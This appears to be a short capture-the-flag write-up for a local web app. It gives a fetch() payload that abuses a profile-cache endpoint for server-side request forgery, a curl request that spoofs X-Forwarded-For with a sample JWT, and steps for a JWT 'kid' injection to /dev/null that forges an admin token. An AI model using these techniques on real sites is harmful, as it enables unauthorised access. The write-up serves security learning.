# writeup: 

## Cache poisoning -> SSRF 
1. View source code of home page and notice that debug.txt is mentioned. 
2. navigate api docs and observe a request to cache the profile picture, cache debug.txt instead of profile picture from console. 

fetch('/update-profile-cache', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    ip: '127.0.0.1',
    url: 'localhost/debug.txt'     //ssrf
  })
}).then(r => r.json()).then(console.log)


2. Now make request to /get-profile-picture endpoint with your JWT and x-forwarded-for: 127.0.0.1 header

curl -H "X-Forwarded-For: 127.0.0.1" -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0NzgwMzgwNywiZXhwIjoxNzQ3ODA3NDA3fQ.MYUIX6GNwlLHPJw5VuNwbzjeK3uX0NqSqSBBRnI27Ys" http://localhost:3000/get-profile-pic

## JWT KID injection / none key bypass

1. set role to the required role.
2. set kid to /dev/null				// null 
3. Generate JWT and make reqest to /admin
4. Visit the identified admin endpoint and visit the page. 

